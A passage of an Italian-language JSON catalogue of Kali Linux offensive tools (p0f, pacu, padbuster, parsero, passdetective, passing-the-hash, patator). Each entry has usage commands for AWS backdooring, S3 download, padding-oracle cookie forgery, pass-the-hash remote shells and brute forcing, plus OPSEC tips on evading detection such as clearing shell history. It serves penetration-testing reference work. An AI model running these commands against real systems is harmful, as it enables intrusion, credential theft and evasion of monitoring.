    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>P0f è uno strumento di passive OS fingerprinting che identifica sistemi operativi, versioni software e configurazioni di rete analizzando esclusivamente il traffico TCP/IP in modo completamente passivo. A differenza di scanner attivi come Nmap, p0f non invia alcun pacchetto sulla rete: si limita a osservare il traffico esistente, rendendolo completamente invisibile ai sistemi di rilevamento. Analizza caratteristiche del TCP/IP stack come TTL iniziale, window size, opzioni TCP, MSS e comportamento di frammentazione per determinare il sistema operativo. P0f versione 3 include anche capacità di rilevamento di connessioni NAT, proxy, bilanciatori di carico e analisi del traffico HTTP per identificare applicazioni e browser.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fingerprinting passivo TCP/IP:</strong> P0f analizza i pacchetti SYN e SYN+ACK per estrarre la firma del TCP/IP stack del sistema remoto. Ogni sistema operativo ha caratteristiche distintive nel modo in cui implementa lo stack TCP: valori di TTL, dimensione della finestra, opzioni TCP (SACK, timestamp, window scaling) e il loro ordine. Il database di firme include centinaia di varianti per Windows, Linux, macOS, BSD, dispositivi embedded e apparati di rete.</p><p><strong>Rilevamento NAT e proxy:</strong> Analizzando inconsistenze nei valori TTL, MTU e nelle firme TCP tra connessioni diverse dallo stesso IP, p0f può identificare la presenza di dispositivi NAT e proxy interposti. Questo è utile per determinare se più sistemi si nascondono dietro un singolo IP o se il traffico viene mediato da un load balancer. Il rilevamento è puramente passivo e non richiede interazione con i dispositivi.</p><p><strong>Analisi HTTP passiva:</strong> P0f può analizzare gli header HTTP in transito per identificare browser, web server e framework applicativi. L'ordine e il formato degli header HTTP sono caratteristici di ogni implementazione e permettono un fingerprinting più granulare rispetto al solo livello TCP/IP. Questa funzionalità è utile per identificare client e server specifici nel traffico monitorato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>P0f può operare su interfacce di rete live o su file pcap catturati precedentemente.</p><pre><code># Fingerprinting passivo sull'interfaccia di rete\np0f -i eth0\n\n# Analisi di un file pcap\np0f -r capture.pcap\n\n# Output su file di log\np0f -i eth0 -o /tmp/p0f.log\n\n# Filtro su IP specifico\np0f -i eth0 'host 192.168.1.100'\n\n# Modalità daemon con socket API\np0f -i eth0 -s /tmp/p0f.sock -d\n\n# Query al daemon via API\np0f-client /tmp/p0f.sock 192.168.1.100\n\n# Analisi con filtro BPF\np0f -i eth0 'tcp port 80 or tcp port 443'</code></pre><p>P0f genera output in tempo reale mostrando per ogni connessione osservata il sistema operativo identificato, la distanza in hop, il tipo di link e eventuali anomalie rilevate. La modalità daemon permette di interrogare il database di risultati tramite socket Unix.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>P0f è essenziale nelle fasi iniziali di reconnaissance quando è fondamentale non generare traffico che potrebbe allertare i sistemi di difesa del target. Posizionato su un segmento di rete compromesso o su un host con accesso al traffico (tramite span port o ARP spoofing), p0f permette di mappare sistemi operativi e servizi senza inviare un singolo pacchetto. In operazioni di red team, p0f viene utilizzato per identificare sistemi operativi prima di selezionare exploit appropriati. I team di difesa utilizzano p0f per monitorare passivamente la rete e identificare dispositivi non autorizzati, rogue AP o sistemi compromessi il cui stack TCP mostra anomalie. È anche impiegato per rilevare tentativi di OS spoofing dove un attaccante modifica le caratteristiche del proprio stack TCP.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> P0f è completamente passivo e non genera alcun traffico di rete, rendendolo virtualmente non rilevabile. L'unico requisito è l'accesso al traffico di rete, che può essere ottenuto tramite promiscuous mode sull'interfaccia locale, span port o posizionamento inline. Non esiste modo per il target di rilevare l'osservazione passiva del proprio traffico.</p><p><strong>Impatto operativo:</strong> L'accuratezza del fingerprinting dipende dalla qualità e quantità del traffico osservato. Connessioni cifrate (TLS) non impediscono il fingerprinting TCP/IP ma precludono l'analisi HTTP. Sistemi che utilizzano stack TCP personalizzati o tool di OS spoofing possono generare risultati errati. La modalità promiscuous può essere rilevata sulla rete locale tramite tecniche specifiche.</p><p><strong>Mitigazioni:</strong> P0f è già lo strumento più OPSEC-safe per fingerprinting. Per massimizzare l'efficacia, posizionarsi in un punto della rete con visibilità sul traffico del target (choke point, span port). Combinare i risultati con altre fonti passive per validazione incrociata. Verificare che la modalità promiscuous non venga rilevata da tool come arpwatch sulla rete locale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "pacu",
    "name": "pacu",
    "version": "1.6.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pacu/",
    "desc": "Framework AWS exploitation per enumeration, privilege escalation e persistence su cloud.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Pacu è un framework di exploitation open-source progettato specificamente per ambienti Amazon Web Services (AWS). Sviluppato da Rhino Security Labs, offre una suite completa di moduli per enumerazione, privilege escalation, persistence e data exfiltration su servizi AWS. Pacu funziona utilizzando credenziali AWS (access key e secret key) ottenute durante la fase di compromissione e permette di esplorare sistematicamente l'ambiente cloud per identificare misconfigurazioni e percorsi di escalation. Il framework mantiene un database locale delle informazioni raccolte durante la sessione e supporta sessioni multiple per gestire diversi engagement. È lo strumento di riferimento per il cloud penetration testing su AWS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumerazione servizi AWS:</strong> Pacu include moduli per enumerare IAM (utenti, ruoli, policy, gruppi), EC2 (istanze, security group, snapshot), S3 (bucket, policy, ACL), Lambda, RDS, ECS e molti altri servizi. L'enumerazione è progettata per essere completa ma configurabile: è possibile limitare i servizi da enumerare per ridurre il rumore. I risultati vengono memorizzati nel database della sessione per riferimento rapido durante le fasi successive.</p><p><strong>Privilege escalation automatizzata:</strong> Il modulo iam__privesc_scan analizza le policy IAM dell'utente corrente per identificare percorsi di privilege escalation. Verifica oltre 20 tecniche diverse incluse: iam:CreatePolicy, iam:AttachUserPolicy, lambda:CreateFunction con iam:PassRole, e molte altre. L'escalation può essere eseguita automaticamente o in modalità report-only per assessment non intrusivi.</p><p><strong>Persistence e post-exploitation:</strong> Pacu permette di creare backdoor persistenti nell'ambiente AWS tramite creazione di access key aggiuntive, Lambda functions per mantenere accesso, modifiche a trust policy dei ruoli e creazione di utenti IAM nascosti. I moduli di exfiltration supportano il download massivo da S3, snapshot EBS e backup RDS. Il modulo ec2__backdoor_ec2_sec_groups modifica i security group per garantire accesso di rete persistente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Pacu si avvia come shell interattiva dove si configurano le credenziali e si eseguono i moduli.</p><pre><code># Avvio e creazione sessione\npacu\nset_keys  # inserire access_key e secret_key\n\n# Enumerazione IAM completa\nrun iam__enum_permissions\nrun iam__enum_users_roles_policies_groups\n\n# Verifica percorsi di privilege escalation\nrun iam__privesc_scan\n\n# Enumerazione EC2\nrun ec2__enum --regions us-east-1,eu-west-1\n\n# Enumerazione bucket S3\nrun s3__enum\nrun s3__download_bucket --bucket target-bucket\n\n# Creazione persistence\nrun iam__backdoor_users_keys --usernames admin\n\n# Whoami equivalente\nwhoami</code></pre><p>Il comando whoami mostra le informazioni sull'identità corrente e i permessi enumerati. Il comando data mostra tutti i dati raccolti durante la sessione organizzati per servizio.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Pacu è lo strumento principale durante cloud penetration test su AWS. Il workflow tipico inizia con credenziali ottenute da file di configurazione esposti, repository Git, metadata service di istanze EC2 o variabili d'ambiente. Con queste credenziali, il tester usa Pacu per enumerare i permessi effettivi e identificare percorsi di escalation verso admin. Una volta ottenuti privilegi elevati, Pacu viene utilizzato per dimostrare l'impatto della compromissione accedendo a dati sensibili in S3, database RDS e secrets in Systems Manager Parameter Store. In assessment di conformità cloud, Pacu viene usato per verificare che le policy IAM seguano il principio del privilegio minimo e che non esistano percorsi di escalation non intenzionali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Tutte le operazioni API AWS vengono loggate in CloudTrail. Le chiamate di enumerazione IAM, EC2 e S3 generano eventi facilmente correlabili. L'uso di credenziali da IP non abituali attiva alert in GuardDuty (UnauthorizedAccess finding). Tentativi di privilege escalation generano eventi IAM specifici monitorati da soluzioni CSPM.</p><p><strong>Impatto operativo:</strong> Le chiamate API hanno rate limit per account AWS che possono essere raggiunti durante enumerazione massiva. Operazioni di modifica (creazione utenti, modifica policy) sono irreversibili e visibili immediatamente. Alcune operazioni possono generare costi AWS significativi (avvio di istanze EC2, trasferimento dati S3).</p><p><strong>Mitigazioni:</strong> Limitare l'enumerazione a regioni e servizi rilevanti per ridurre il volume di eventi CloudTrail. Utilizzare il flag --regions per restringere lo scope. Evitare operazioni distruttive in ambienti di produzione. Verificare i permessi correnti con whoami prima di tentare operazioni che potrebbero generare AccessDenied visibili nei log. Operare durante orari di attività normale per mimetizzarsi nel traffico API legittimo.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Cloud"
    ],
    "notes": null
  },
  {
    "id": "padbuster",
    "name": "padbuster",
    "version": "0.3.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/padbuster/",
    "desc": "Exploita vulnerabilità padding oracle per decifrare e forgiare cookie crittografati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PadBuster</strong> è uno strumento Perl per sfruttare vulnerabilità <strong>Padding Oracle</strong> in applicazioni web che utilizzano cifratura a blocchi in modalità CBC (Cipher Block Chaining). Un padding oracle si verifica quando un'applicazione restituisce risposte diverse a seconda che il padding di un messaggio cifrato sia valido o meno (es. errore 500 vs 200, messaggio di errore diverso). Sfruttando questa differenza, PadBuster può <strong>decifrare</strong> qualsiasi dato cifrato byte per byte senza conoscere la chiave di cifratura, e può anche <strong>forgiare</strong> nuovi dati cifrati con plaintext arbitrario. L'attacco è stato reso famoso da Juliano Rizzo e Thai Duong nel 2010 con l'exploit Padding Oracle On Downgraded Legacy Encryption (POODLE) e l'attacco ASP.NET che ha colpito milioni di applicazioni web.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decrypt Mode:</strong> Decifra dati crittografati un byte alla volta sfruttando le risposte differenziate dell'oracle. Per ogni byte, PadBuster invia fino a 256 richieste modificando il blocco precedente finché l'applicazione non indica padding valido. Questo rivela il byte intermedio, da cui si calcola il plaintext.</p><p><strong>Encrypt Mode (Forging):</strong> Crea nuovi dati cifrati con plaintext arbitrario, utilizzando la stessa tecnica al contrario. Permette di forgiare cookie di autenticazione, token di sessione o qualsiasi dato cifrato dall'applicazione con contenuto controllato dall'attaccante (es. <code>admin=true</code> al posto di <code>admin=false</code>).</p><p><strong>Block Size Detection:</strong> Gestisce automaticamente cifrature con blocchi di dimensioni diverse (8 byte per DES/3DES, 16 byte per AES). Il block size viene specificato come parametro o rilevato automaticamente.</p><p><strong>Encoding Support:</strong> Supporta diversi formati di encoding dei dati cifrati: Base64 (standard e URL-safe), esadecimale, e encoding custom. Fondamentale perché i cookie e i parametri URL usano encoding diversi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>PadBuster richiede l'URL vulnerabile, il valore cifrato da attaccare e il block size.</p><pre><code># Decifrare un cookie di autenticazione\npadbuster http://target.com/app \"dGVzdA==\" 8 -cookies \"auth=dGVzdA==\"\n\n# Forgiare un cookie con plaintext arbitrario\npadbuster http://target.com/app \"dGVzdA==\" 8 -plaintext \"user=admin\" -cookies \"auth=dGVzdA==\"\n\n# Specificare l'encoding (0=Base64, 1=lowercase hex, 2=uppercase hex)\npadbuster http://target.com/app \"4F2E1A...\" 16 -encoding 1\n\n# Personalizzare la condizione di errore\npadbuster http://target.com/app \"data\" 8 -error \"Invalid padding\"\n\n# Con POST request\npadbuster http://target.com/login \"data\" 16 -post \"token=data&action=login\"\n\n# Specificare prefisso/suffisso per il parametro nell'URL\npadbuster http://target.com/page?data=ENCRYPTED 8 -prefix \"data=\"\n\n# Verbose per debugging\npadbuster http://target.com/app \"data\" 8 -verbose</code></pre><p>Il processo di decifratura richiede fino a 256 × N richieste (dove N è il numero di byte cifrati). Per un cookie di 32 byte con blocchi da 8, circa 8.192 richieste.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Application Testing:</strong> Bypass autenticazione su applicazioni che usano cookie cifrati in CBC senza HMAC. Se l'applicazione cifra i dati utente (ruolo, username) nel cookie, PadBuster può decifrare il contenuto e forgiare un cookie con privilegi elevati.</p><p><strong>ASP.NET ViewState:</strong> Storicamente, ASP.NET era vulnerabile al padding oracle attack sul ViewState cifrato. PadBuster poteva decifrare e modificare il ViewState per ottenere esecuzione di codice remoto (CVE-2010-3332).</p><p><strong>Crypto Assessment:</strong> Dimostrare la necessità di utilizzare <strong>Authenticated Encryption</strong> (AES-GCM, ChaCha20-Poly1305) o almeno Encrypt-then-MAC anziché la semplice cifratura CBC senza autenticazione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Volume di richieste:</strong> L'attacco genera migliaia di richieste HTTP in rapida successione, facilmente rilevabile nei log del web server e del WAF come pattern anomalo di errori ripetuti.</p><p><strong>Rate Limiting:</strong> Molte applicazioni moderne implementano rate limiting che rallenta o blocca l'attacco. I WAF (ModSecurity, Cloudflare) possono rilevare il pattern di richieste con variazioni minime nel parametro cifrato.</p><p><strong>Applicabilità:</strong> La vulnerabilità è diventata rara nelle applicazioni moderne che usano framework aggiornati. Resta rilevante su applicazioni legacy, sistemi embedded e implementazioni custom della crittografia.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Crypto"
    ],
    "notes": null
  },
  {
    "id": "parsero",
    "name": "parsero",
    "version": "0.81~git20140929",
    "icon": "../app/icons/parsero-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/parsero/",
    "desc": "Analizza robots.txt per trovare directory nascoste e percorsi sensibili esposti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Parsero</strong> è uno strumento Python che analizza il file <code>robots.txt</code> di un sito web per estrarre e verificare i percorsi che gli amministratori hanno marcato come <strong>Disallow</strong> (da non indicizzare dai motori di ricerca). Paradossalmente, il file robots.txt è una miniera d'oro per i pentester: le directory che un'organizzazione vuole nascondere ai crawler sono spesso le più interessanti da un punto di vista offensivo. Pannelli di amministrazione, directory di backup, file di configurazione, API interne e aree di staging sono comunemente elencati nel robots.txt. Parsero automatizza l'estrazione di queste entry e, opzionalmente, verifica quali percorsi sono effettivamente <strong>accessibili</strong> (status code 200) e quali restituiscono 403/404, fornendo una lista immediata di target interessanti per analisi ulteriori.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Robots.txt Parsing:</strong> Scarica e analizza il file robots.txt del target, estraendo tutte le direttive <code>Disallow</code> per ogni User-Agent. Identifica anche direttive <code>Allow</code>, <code>Sitemap</code> e commenti che possono rivelare informazioni aggiuntive.</p><p><strong>Status Code Verification:</strong> Per ogni percorso Disallow trovato, esegue una richiesta HTTP per verificare se è effettivamente accessibile (200 OK) o bloccato (403 Forbidden, 404 Not Found). Evidenzia i percorsi accessibili come potenziali finding di sicurezza.</p><p><strong>Batch Scanning:</strong> Supporta la scansione di liste di URL da file, permettendo di analizzare rapidamente il robots.txt di centinaia di domini durante la fase di reconnaissance.</p><p><strong>Output Filtrato:</strong> Può mostrare solo i percorsi accessibili (status 200), riducendo il rumore e concentrando l'attenzione sui finding più interessanti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lanciare Parsero specificando l'URL del target.</p><pre><code># Estrarre tutte le entry Disallow dal robots.txt\nparsero -u http://target.com\n\n# Verificare quali percorsi sono accessibili (status 200)\nparsero -u http://target.com -sb\n\n# Scansione batch da file di URL\nparsero -f targets.txt\n\n# Scansione batch con verifica accessibilità\nparsero -f targets.txt -sb</code></pre><p>L'output mostra ogni percorso Disallow con il relativo status code HTTP. I percorsi con status 200 meritano indagine approfondita.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Reconnaissance:</strong> Primo step rapido durante la ricognizione web. Il robots.txt spesso rivela la struttura interna del sito e l'esistenza di aree come <code>/admin/</code>, <code>/backup/</code>, <code>/staging/</code>, <code>/api/internal/</code> che non sarebbero altrimenti scoperte senza content discovery.</p><p><strong>Content Discovery Targeted:</strong> I percorsi trovati nel robots.txt guidano la content discovery successiva. Sapere che esiste <code>/admin/</code> permette di focalizzare il fuzzing su quella directory specifica (es. <code>/admin/login</code>, <code>/admin/config</code>).</p><p><strong>Bug Bounty:</strong> Molti programmi di bug bounty premiano la scoperta di pannelli di amministrazione, file di backup e endpoint non documentati accessibili pubblicamente. Il robots.txt è il primo posto da controllare.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Basso rumore iniziale:</strong> La richiesta del robots.txt è una singola richiesta HTTP standard, indistinguibile dal normale traffico web. La fase di status check genera richieste aggiuntive (una per percorso) che possono essere notate nei log.</p><p><strong>Legalità:</strong> Il file robots.txt è pubblicamente accessibile e la sua lettura è legale. Tuttavia, l'accesso ai percorsi Disallow potrebbe non essere autorizzato. Il robots.txt è una direttiva per i bot, non una misura di sicurezza.</p><p><strong>Limitazioni:</strong> Molti siti moderni non hanno un robots.txt significativo o usano meta tag robots nelle pagine HTML. Combinare con Google Dorks (<code>site:target.com</code>) e tool di content discovery per una copertura più completa.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "passdetective",
    "name": "passdetective",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/passdetective/",
    "desc": "Cerca password e secrets nella cronologia browser e file locali su sistemi compromessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PassDetective</strong> è uno strumento di <strong>credential harvesting</strong> post-exploitation che analizza la cronologia dei comandi shell e i file di configurazione locali per identificare password, chiavi API, token e altri secret inseriti accidentalmente in chiaro. A differenza di tool come LaZagne o Mimikatz che estraggono credenziali dai password store del sistema operativo, PassDetective si concentra su un vettore spesso trascurato: la <strong>cronologia dei comandi</strong> (<code>.bash_history</code>, <code>.zsh_history</code>, PowerShell history). Gli utenti inseriscono frequentemente password come argomenti da riga di comando (es. <code>mysql -u root -ppassword123</code>, <code>curl -u admin:secret</code>, <code>sshpass -p 'mypass'</code>), e queste vengono salvate permanentemente nei file di cronologia. PassDetective automatizza la ricerca di questi pattern in molteplici fonti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Shell History Analysis:</strong> Analizza i file di cronologia di diverse shell (bash, zsh, fish, PowerShell) cercando comandi che contengono credenziali come argomenti. Riconosce pattern di tool comuni: <code>mysql -p</code>, <code>psql -W</code>, <code>sshpass</code>, <code>curl -u</code>, <code>wget --password</code>, <code>htpasswd</code>, <code>openssl</code> e molti altri.</p><p><strong>Configuration File Scanning:</strong> Scansiona file di configurazione comuni che spesso contengono credenziali in chiaro: <code>.env</code>, <code>.git-credentials</code>, <code>.netrc</code>, <code>wp-config.php</code>, file di configurazione database e script di automazione.</p><p><strong>Pattern Matching Customizzabile:</strong> Le regex di ricerca sono configurabili, permettendo di aggiungere pattern specifici per l'ambiente target (credenziali proprietarie, formati di token custom, API key di servizi specifici).</p><p><strong>Multi-Platform:</strong> Funziona su Linux, macOS e Windows, analizzando i file di cronologia specifici di ogni sistema operativo e shell.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire sulla macchina target dopo aver ottenuto accesso.</p><pre><code># Scan completo del sistema locale\npassdetective\n\n# Scan solo cronologia shell\npassdetective --history\n\n# Specificare utente target\npassdetective --user john\n\n# Cercare pattern personalizzati\npassdetective --pattern \"api[_-]?key|secret[_-]?key|token\"\n\n# Output in formato JSON per analisi strutturata\npassdetective --output results.json\n\n# Scan silenzioso (solo risultati)\npassdetective --quiet\n\n# Analizzare un file specifico\npassdetective --file /home/user/.bash_history</code></pre><p>L'output mostra il file sorgente, la riga contenente il secret, il tipo di credenziale identificata e il valore estratto. I risultati sono ordinati per probabilità di essere un vero secret.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Post-Exploitation Credential Harvesting:</strong> Dopo aver ottenuto una shell su un sistema, PassDetective è uno dei primi tool da eseguire per raccogliere credenziali. Le password trovate nella cronologia comandi sono spesso riutilizzate per altri servizi (database, SSH, VPN), abilitando il lateral movement.</p><p><strong>Privilege Escalation:</strong> Credenziali di utenti privilegiati (root, DBA) trovate nella cronologia comandi possono fornire un percorso diretto alla privilege escalation senza necessità di exploit tecnici.</p><p><strong>Digital Forensics:</strong> Durante un'indagine, analizzare la cronologia comandi per identificare attività sospette, credenziali usate e comandi eseguiti dall'attaccante o dall'utente compromesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accesso al filesystem:</strong> La lettura di file nella home directory degli utenti può essere monitorata da soluzioni EDR e audit del filesystem. Su Linux, l'accesso ai file di cronologia di altri utenti richiede privilegi root.</p><p><strong>Tracce:</strong> L'esecuzione stessa di PassDetective viene registrata nella cronologia comandi. Usare <code>unset HISTFILE</code> o <code>export HISTSIZE=0</code> prima dell'esecuzione per evitare di lasciare traccia del tool nella history.</p><p><strong>Complementarità:</strong> Combinare con LaZagne (password store OS), Mimikatz (credenziali Windows in memoria), e browser credential extractors per una raccolta completa di credenziali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "passing-the-hash",
    "name": "passing-the-hash",
    "version": "0~2015.12.37",
    "icon": "../app/icons/passing-the-hash-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/passing-the-hash/",
    "desc": "Toolkit per autenticazione NTLM con hash invece di password in clear-text.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Passing-the-Hash (PTH) Toolkit</strong> è una collezione di tool Linux modificati per supportare l'autenticazione <strong>NTLM tramite hash</strong> anziché password in chiaro. La tecnica Pass-the-Hash sfrutta il modo in cui Windows gestisce l'autenticazione NTLM: quando un utente si autentica, il sistema calcola l'hash NTLM della password e lo usa per il challenge/response. Se un attaccante possiede già l'hash NTLM (ottenuto tramite SAM dump, LSASS dump o DC Sync), può autenticarsi direttamente senza conoscere la password originale. Il toolkit include versioni patchate di <code>smbclient</code>, <code>winexe</code>, <code>wmic</code> e <code>rpcclient</code> che accettano hash NTLM al posto della password, permettendo l'accesso a share SMB, l'esecuzione di comandi remoti e le query WMI utilizzando solo l'hash.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>pth-smbclient:</strong> Versione modificata di smbclient che accetta hash NTLM per autenticarsi a share SMB remote. Permette di navigare, scaricare e caricare file su share protette usando l'hash di un utente con permessi adeguati.</p><p><strong>pth-winexe:</strong> Esegue comandi arbitrari su sistemi Windows remoti tramite il servizio Windows Management (simile a PsExec), autenticandosi con hash NTLM. Restituisce una shell cmd.exe interattiva sulla macchina target.</p><p><strong>pth-wmic:</strong> Esegue query WMI (Windows Management Instrumentation) su sistemi remoti. Permette di enumerare processi, servizi, software installato, utenti e informazioni di sistema senza bisogno della password.</p><p><strong>pth-rpcclient:</strong> Versione modificata di rpcclient per eseguire chiamate RPC autenticate con hash. Utile per enumerazione utenti, gruppi, share e policy del dominio Active Directory.</p><p><strong>pth-net:</strong> Versione di net che supporta PTH per operazioni di rete Windows: join di dominio, enumerazione trust e gestione utenti remoti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il formato dell'hash per tutti i tool è <code>LMHash:NTHash</code>. Se si ha solo l'hash NT, usare <code>aad3b435b51404eeaad3b435b51404ee</code> come LM hash (hash di stringa vuota).</p><pre><code># Accesso a share SMB con hash NTLM\npth-smbclient //10.10.10.1/C$ -U DOMAIN/Administrator%aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n\n# Esecuzione comandi remoti (shell interattiva)\npth-winexe -U DOMAIN/Administrator%aad3b435b51404ee:31d6cfe0d16ae931 //10.10.10.1 cmd.exe\n\n# Query WMI per elencare processi\npth-wmic -U DOMAIN/user%hash //10.10.10.1 \"select Name,ProcessId from Win32_Process\"\n\n# Enumerazione RPC\npth-rpcclient -U DOMAIN/user%hash 10.10.10.1\n\n# Enumerazione utenti via RPC\npth-rpcclient -U DOMAIN/user%hash 10.10.10.1 -c \"enumdomusers\"\n\n# Esecuzione PowerShell remoto\npth-winexe -U DOMAIN/Admin%hash //10.10.10.1 \"powershell.exe -ep bypass\"</code></pre><p>Per scenari moderni, considerare anche <code>impacket-psexec</code>, <code>impacket-wmiexec</code> e <code>evil-winrm</code> che supportano nativamente PTH con interfacce più moderne.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Lateral Movement:</strong> Dopo aver ottenuto hash NTLM da un sistema compromesso (LSASS dump, SAM extraction), PTH permette di muoversi lateralmente verso altri sistemi dove lo stesso utente ha accesso, senza dover crackare la password.</p><p><strong>Domain Admin Exploitation:</strong> Con l'hash di un Domain Admin, pth-winexe fornisce accesso completo a qualsiasi macchina del dominio, inclusi i Domain Controller. Questo è spesso il passo finale di un penetration test AD.</p><p><strong>Persistence:</strong> Gli hash NTLM non cambiano finché la password non viene modificata. Un attaccante con l'hash può mantenere l'accesso indefinitamente senza che la password venga esposta o cambiata.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Event Logging:</strong> Le autenticazioni PTH generano eventi Windows Security identici a login NTLM normali (Event ID 4624, logon type 3). Tuttavia, SIEM avanzati possono correlare login dallo stesso account da IP geograficamente impossibili o in orari anomali.</p><p><strong>Credential Guard:</strong> Su Windows 10+ e Server 2016+ con Credential Guard abilitato, gli hash NTLM in memoria sono protetti dall'estrazione. PTH resta efficace se gli hash sono stati ottenuti da altre fonti (DC Sync, backup SAM, password spray + NTLM hash calculation).</p><p><strong>Alternative moderne:</strong> Impacket Suite offre funzionalità equivalenti con interfacce più moderne e manutenzione attiva. <code>evil-winrm</code> supporta PTH via WinRM. CrackMapExec integra PTH con automazione multi-host. Il PTH Toolkit resta utile ma è meno mantenuto.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "patator",
    "name": "patator",
    "version": "1.0",
    "icon": "../app/icons/patator-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/patator/",
    "desc": "Brute forcer modulare multi-protocollo: SSH, FTP, HTTP, LDAP, SMB con threading.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Patator</strong> è un brute-forcer modulare multi-threaded scritto in Python, progettato per essere più flessibile e configurabile di alternative come Hydra o Medusa. La sua caratteristica distintiva è il sistema di <strong>condizioni di filtro</strong>: anziché definire cosa costituisce un login riuscito (che varia enormemente tra applicazioni), Patator permette di specificare cosa <em>ignorare</em> (risposte di errore note), mostrando solo le risposte che differiscono dal pattern di fallimento. Supporta un'ampia gamma di protocolli e servizi: SSH, FTP, HTTP (GET/POST/form), SMB, LDAP, MySQL, MSSQL, Oracle, PostgreSQL, POP3, IMAP, SMTP, VNC, RDP, SNMP, DNS e molti altri. Ogni protocollo è implementato come modulo separato con parametri specifici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Architettura Modulare:</strong> Ogni protocollo ha il proprio modulo (es. <code>ssh_login</code>, <code>http_fuzz</code>, <code>smb_login</code>) con parametri specifici. Questo approccio permette un controllo granulare sulle richieste e sulle condizioni di successo/fallimento per ogni tipo di servizio.</p><p><strong>Filtro Condizionale Avanzato:</strong> Il sistema <code>-x ignore:condition</code> permette di filtrare le risposte basandosi su molteplici criteri: status code HTTP, testo nella risposta (fgrep/egrep), dimensione della risposta, tempo di risposta. Questo è fondamentale per applicazioni web dove la definizione di \"login fallito\" varia enormemente.</p><p><strong>Threading e Rate Control:</strong> Controllo preciso sul numero di thread paralleli (<code>--threads</code>), delay tra le richieste (<code>--rate-limit</code>), timeout per connessione e retry automatico in caso di errori temporanei. Essenziale per evitare account lockout e detection.</p><p><strong>Combo e Cluster Mode:</strong> Supporta file di combinazioni user:password (combo lists), permute di file multipli, e modalità cluster per distribuire il carico su più macchine.</p><p><strong>Logging Dettagliato:</strong> Salva log completi di ogni tentativo con timestamp, parametri usati e risposta ricevuta, permettendo analisi post-scan e ripresa di scan interrotti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ogni modulo ha i propri parametri. I file di input si referenziano con <code>FILE0</code>, <code>FILE1</code>, etc.</p><pre><code># Brute force SSH\npatator ssh_login host=10.10.10.1 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt\n\n# Password spray SSH (un utente, molte password)\npatator ssh_login host=10.10.10.1 user=admin password=FILE0 0=passwords.txt\n\n# HTTP POST form brute force (ignora risposte con \"Invalid\")\npatator http_fuzz url=http://target/login method=POST \\\n  body='username=FILE0&password=FILE1' \\\n  0=users.txt 1=passwords.txt \\\n  -x ignore:fgrep='Invalid credentials'\n\n# FTP con rate limiting (1 tentativo al secondo)\npatator ftp_login host=10.10.10.1 user=admin password=FILE0 \\\n  0=passwords.txt --rate-limit=1\n\n# SMB login\npatator smb_login host=10.10.10.1 user=FILE0 password=FILE1 \\\n  